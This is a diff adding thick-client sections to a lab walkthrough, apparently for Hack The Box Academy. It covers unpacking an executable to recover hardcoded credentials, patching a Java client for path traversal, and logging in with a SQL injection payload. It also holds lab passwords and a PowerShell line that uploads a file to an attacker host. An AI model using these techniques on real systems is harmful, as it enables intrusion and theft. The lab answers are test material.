@@ -27,6 +27,9 @@
 6. [Common Gateway Interfaces](#common-gateway-interfaces-1)
     1. [Attacking Tomcat CGI](#attacking-tomcat-cgi)
     2. [Attacking Common Gateway Interface (CGI) Applications - Shellshock](#attacking-common-gateway-interface-cgi-applications---shellshock)
+7. [Thick Client Applications](#thick-client-applications-1)
+    1. [Attacking Thick Client Applications](#attacking-thick-client-applications)
+    2. [Exploiting Web Vulnerabilities in Thick-Client Applications](#exploiting-web-vulnerabilities-in-thick-client-applications)
 
 ## Tools
 ### Application Discovery & Enumeration
@@ -51,6 +54,11 @@
 - [gitlab_13_10_2_rce.py](https://www.exploit-db.com/exploits/49951)
 ### Common Gateway Interfaces
 - ffuf
+### Thick Client Applications
+- Procmon64.exe
+- dnSpy
+- de4dot
+- x64dbg
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -603,3 +611,414 @@
     ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 3.png>)
 
     The answer is `Sh3ll_Sh0cK_123`.
+
+## Thick Client Applications
+### Attacking Thick Client Applications
+1. Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.
+
+    First, we need to rdp to the target.
+
+    ```bash
+    xfreerdp /v:10.129.228.115 /u:cybervaca /p:"&aue%C)}6g-d{w" /cert:ignore /dynamic-resolution /drive:parrotshare,/mnt/parrotshare
+    ```
+    To solve this, there are several steps.
+
+    1. Behavioral Analysis (The Discovery)
+
+        We use **Procmon64.exe** tool to analyze the behavior of Restart-OracleService.exe. Once we have opened **Procmon64.exe**:
+            - click capture icon to stop capturing 
+            - Click clear icon to erase captured service
+            - Click the filter icon
+            - Add a rule: Process Name is Restart-OracleService.exe then Include. It will be look like this.
+
+            ![alt text](<Assets/Attacking Thick Client Applications - 1.png>)
+        
+        Once we have applied the the filter/rule, we can click capture button again to start capturing and run `Restart-OracleService.exe`.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 2.png>)
+
+        We can see that after the program is executed, it will create a file and delete it immedietly. The location is in **C:\Users\cybervaca\AppData\Local\Temp** folder. We need to prevent the deletion to analzye the file.
+
+    2. Preventing deletion ( Change Folder Permissions)
+
+        To prevent the deletion, we need to change the folder **C:\Users\cybervaca\AppData\Local\Temp** permission. So, the service just created cant be deleted. Here the steps to do this.
+
+            - Visit C:\Users\cybervaca\AppData\Local\Temp
+            - Then click Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions
+            - Deselect Delete and the Delete subfolders and files checkboxes.
+
+        It will look like this.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 3.png>)
+    
+    3. Extraction (The Batch Script)
+
+        Now, we need to run the `Restart-OracleService.exe` again. 
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 4.png>)
+
+        As expected, the bat file is not deleted immedietly. Here the content of D81F.bat.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 5.png>)
+
+        Based on that, It deletes the temporary files (monta.ps1, oracle.txt). Maybe to hide the evidence? We can modify D81F.bat to prevent the deletion. We can delete these lines:
+
+        ```bat
+        if %username% == cybervaca goto correcto
+        if %username% == frankytech goto correcto
+        if %username% == ev4si0n goto correcto
+        goto error
+
+        powershell.exe -exec bypass -file c:\programdata\monta.ps1
+        del c:\programdata\monta.ps1
+        del c:\programdata\oracle.txt
+        c:\programdata\restart-service.exe
+        del c:\programdata\restart-service.exe
+        :error
+        ```
+        Once we have saved the modification .bat file, we can run the .bat file.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 6.png>)
+
+        We can go to `c:\programdata`. We will find `monta.ps1` and `oracle.txt`. Here the content of `montas.ps1`.
+
+        ```powershell
+         $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))      
+        ```
+        This PowerShell script (monta.ps1) is the "assembler." It takes the raw text data created by the batch file and turns it back into a functional executable program (restart-service.exe).
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 7.png>)
+
+        By executing monta.ps1 we get restart-service.exe. We can analyze this file.
+
+    4. Unpacking (The Memory Dump)
+
+        Now, we can use **x64dbg** with Options -> Preferences and only check Exit Breakpoint option. This will make x64dbg to start directly from the application's exit point. This will avoid going through any dll files that are loaded before the app starts. We need to restart x64dbg. Then, we can open restart-service.exe in the x64dbg. After that, we need right click in the cpu session and select Follow in Memory Map. 
+
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 8.png>)
+
+        We found interesting result. Why it is interesting?
+
+            - MAP Type : Instead of running code directly, the wrapper creates a special chunk of memory that acts like a virtual file on the disk. This is called a Memory Mapped File.
+            - -RW-- Protection: The wrapper has to write the hidden code into this memory space. If the memory was "Read Only" (-R---) or "Execute" (--X--), the wrapper wouldn't be able to "unpack" or copy the payload there. It must be Writable (W) during this phase.
+            - Size Approx 3000 : This is a typical size for a small, custom-made hacking tool or script (like a credential dumper). It's big enough to contain code but small enough to be a simple utility.
+
+        Once we have clicked it, we will see **MZ** magic bytes in there.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 9.png>)
+
+        What is MZ magic bytes means? We found hidden executable. Then right-click that row in the Memory Map -> Dump Memory to File. Save it as restart-service_00000000001F0000.bin.
+    
+    5. Static Analysis (Finding Credentials)
+
+        Now, we can analyze the .bin result by using **strings** tool to find interesting result.
+
+        ```powershell
+        .\strings64.exe  C:\Users\cybervaca\Desktop\restart-service_00000000001F0000.bin
+        ```
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 10.png>)
+
+        We found .NET executable in there. Now, we can use **De4Dot** to reverse .NET executable.
+
+        ```powershell
+        .\de4dot.exe C:\Users\cybervaca\Desktop\restart-service_00000000001F0000.bin
+        ```
+        Then, we can open the result og de4dot by using **dnSpy**.
+
+        ![alt text](<Assets/Attacking Thick Client Applications - 11.png>)
+
+        We can see the username and password is `svc_oracle:#oracle_s3rV1c3!2010`.
+    
+### Exploiting Web Vulnerabilities in Thick-Client Applications
+#### Challenges
+1. What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?
+
+    We need to do like in the module. There are several steps:
+
+    1. Fix the Connection Port
+
+        The client attempts to connect on port 8000, but the server is on 1337. We need to find which files that contain port 8000.
+
+        ```powershell
+        ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
+        ```
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 1.png>)
+
+        We have found that `beans.xml` contain string 8000. Here the content of it.
+
+        ```xml
+        <?xml version = "1.0" encoding = "UTF-8"?>
+
+        <beans xmlns="http://www.springframework.org/schema/beans"
+            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xsi:schemaLocation="
+                        http://www.springframework.org/schema/beans
+                        spring-beans-3.0.xsd">
+
+        <!-- Here we have an constructor based injection, where Spring injects required arguments inside the
+                constructor function. -->
+        <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
+            <constructor-arg index="0" value = "server.fatty.htb"/>
+            <constructor-arg index="1" value = "8000"/>
+        </bean>
+
+        <!-- The next to beans use setter injection. For this kind of injection one needs to define an default
+        constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
+        <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
+            <property name = "keystorePath" value = "fatty.p12"/>
+        </bean>
+
+        <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
+            <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
+        </bean>
+
+        <!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val -->
+        <bean id="connection" class = "htb.fatty.client.connection.Connection">
+            <constructor-arg index = "0" ref = "connectionContext"/>
+            <constructor-arg index = "1" ref = "trustedFatty"/>
+            <constructor-arg index = "2" ref = "secretHolder"/>
+        </bean>
+
+        </beans>
+        ```
+        We need to edit this line, from this:
+
+        ```xml
+        <constructor-arg index="1" value = "8000"/>
+        ```
+        To this:
+        ```xml
+        <constructor-arg index="1" value = "1337"/>
+        ```
+    2. Disabling JAR Integrity Verification
+
+        We need to modify **META-INF/MANIFEST.MF** because this JAR is validating every file's SHA-256 hashes before running. Here the modifed MANIFEST.MF looks like:
+
+        ```txt
+        Manifest-Version: 1.0
+        Archiver-Version: Plexus Archiver
+        Built-By: root
+        Sealed: True
+        Created-By: Apache Maven 3.3.9
+        Build-Jdk: 1.8.0_232
+        Main-Class: htb.fatty.client.run.Starter
+
+        ```
+        Then, we need to delet the **META-INF/1.RSA** and **META-INF/1.SF**. After that, we can build the .jar.
+
+        ```powershell
+        jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar * 
+        ```
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 2.png>)
+
+        We can see that we have successful login. But we cant still click server status -> ipconfig
+    
+    3. Decompile by using JD-GUI
+
+        Select fatty-client-new.jar in JD-GUI. Then, select Save All Sources. After that, we can extract the zip file of it.
+
+
+        (New-Object System.Net.WebClient).UploadFile('http://10.10.14.131:8000/upload.php', 'C:\Apps\fatty-client.jar')
+    
+    4. Enable Path Traversal (Modify ClientGuiTest.java)
+
+        Trick the client into showing us the files in the parent directory (..) instead of the locked configs folder. We need to edit ClientGuiTest.java. Modify configs.addActionListener from this:
+
+
+        ```java
+        /* 368 */     configs.addActionListener(new ActionListener()
+        /*     */         {
+        /*     */           public void actionPerformed(ActionEvent e) {
+        /* 371 */             String response = "";
+        /* 372 */             ClientGuiTest.this.currentFolder = "configs";
+        /*     */             try {
+        /* 374 */               response = ClientGuiTest.this.invoker.showFiles("configs");
+        /* 375 */             } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
+        /* 376 */               JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
+        /*     */ 
+        /*     */             
+        /*     */             }
+        /* 380 */             catch (IOException e2) {
+        /* 381 */               JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
+        /*     */             } 
+        /*     */ 
+        /*     */ 
+        /*     */             
+        /* 386 */             textPane.setText(response);
+        /*     */           }
+        /*     */         });
+        ```
+
+        To this:
+
+        ```java
+                /* 368 */     configs.addActionListener(new ActionListener()
+        /*     */         {
+        /*     */           public void actionPerformed(ActionEvent e) {
+        /* 371 */             String response = "";
+        /* 372 */             ClientGuiTest.this.currentFolder = "..";
+        /*     */             try {
+        /* 374 */               response = ClientGuiTest.this.invoker.showFiles("..");
+        /* 375 */             } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
+        /* 376 */               JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
+        /*     */ 
+        /*     */             
+        /*     */             }
+        /* 380 */             catch (IOException e2) {
+        /* 381 */               JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
+        /*     */             } 
+        /*     */ 
+        /*     */ 
+        /*     */             
+        /* 386 */             textPane.setText(response);
+        /*     */           }
+        /*     */         });
+        ```
+        After that, compile the ClientGuiTest.Java file and do this command. This command will guide until create traverse.jar.
+
+        ```powershell
+        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
+        mkdir raw
+        cp fatty-client-new.jar raw\fatty-client-new-2.jar
+        mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
+        cd raw
+        jar -cmf META-INF\MANIFEST.MF traverse.jar .
+        ```
+        Then open traverse.jar.
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 3.png>)
+
+        Now, we can see the content of the configs/../ by go to FileBrowser -> Config.
+    
+    5. Modify Invoker.java to Download file from the server (fatty-server.jar file)
+
+        We need to modify open function the Invoker.java file. Replace the open function with this:
+
+        ```java
+        import java.io.FileOutputStream;
+        
+        <snip>
+        
+        public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
+            String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
+            logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
+            if (AccessCheck.checkAccess(methodName, this.user)) {
+                return "Error: Method '" + methodName + "' is not allowed for this user account";
+            }
+            this.action = new ActionMessage(this.sessionID, "open");
+            this.action.addArgument(foldername);
+            this.action.addArgument(filename);
+            sendAndRecv();
+            String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
+            FileOutputStream fos = new FileOutputStream(desktopPath);
+            
+            if (this.response.hasError()) {
+                return "Error: Your action caused an error on the application server!";
+            }
+            
+            byte[] content = this.response.getContent();
+            fos.write(content);
+            fos.close();
+            
+            return "Successfully saved the file to " + desktopPath;
+        }
+        ``` 
+        Then, we can rebuild again. 
+
+        ```powershell
+        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\methods\Invoker.java
+        cp fatty-client-new.jar raw\fatty-client-new-3.jar
+        mv -Force fatty-client-new.jar.src\htb\fatty\client\methods\*.class raw\htb\fatty\client\methods\
+        cd raw
+        jar -cmf META-INF\MANIFEST.MF open.jar .
+        ```
+        Then we can open open.jar. After logged in, go to ServerStatus -> config and type fatty-server.jar in the open field.
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 4.png>)
+
+        It should be look like this if success.
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 5.png>)
+
+    6. Disable Password Hashing (Modify User.java)
+
+        The fatty-server.jar analysis revealed an SQL Injection vulnerability, but it requires us to send a plain password. The client currently hashes passwords (SHA-256), which breaks our attack. We must disable that. We can modify user.java. Replace this function:
+
+        ```java
+        /*     */   public User(int uid, String username, String password, String email, Role role) {
+        /*  20 */     this.uid = uid;
+        /*  21 */     this.username = username;
+        /*     */     
+        /*  23 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";
+        /*  24 */     MessageDigest digest = null;
+        /*     */     try {
+        /*  26 */       digest = MessageDigest.getInstance("SHA-256");
+        /*  27 */     } catch (NoSuchAlgorithmException e) {
+        /*  28 */       e.printStackTrace();
+        /*     */     } 
+        /*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
+        /*     */     
+        /*  32 */     this.password = DatatypeConverter.printHexBinary(hash);
+        /*  33 */     this.email = email;
+        /*  34 */     this.role = role;
+        /*     */   }
+        ```
+        With this:
+
+        ```java
+        public User(int uid, String username, String password, String email, Role role) {
+            this.uid = uid;
+            this.username = username;
+            this.password = password;
+            this.email = email;
+            this.role = role;
+        }
+        ```
+
+        And this function:
+
+        ```java
+        /*     */   public void setPassword(String password) {
+        /*  76 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";
+        /*  77 */     MessageDigest digest = null;
+        /*     */     try {
+        /*  79 */       digest = MessageDigest.getInstance("SHA-256");
+        /*  80 */     } catch (NoSuchAlgorithmException e) {
+        /*  81 */       e.printStackTrace();
+        /*     */     } 
+        /*  83 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
+        /*  84 */     this.password = DatatypeConverter.printHexBinary(hash);
+        /*     */   }
+        ```
+        With this:
+        
+        ```java
+        public void setPassword(String password) {
+            this.password = password;
+        }
+        ```
+        Then, we can rebuild again.
+
+        ```powershell
+        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\shared\resources\User.java
+        mv -Force fatty-client-new.jar.src\htb\fatty\shared\resources\User.class raw\htb\fatty\shared\resources\
+        cd raw
+        jar -cmf META-INF\MANIFEST.MF fatty-client-final.jar .
+        ```
+        After that, we can login again by using this payload.
+
+        - Username  : `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`
+        - password  : `abc `
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 6.png>)
+
+        We can see that we have successfully logged in. Now, we can click ServerStatus -> ipconfig.
+
+        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 7.png>)
+
+        The answer is `172.28.0.3`.
+
+
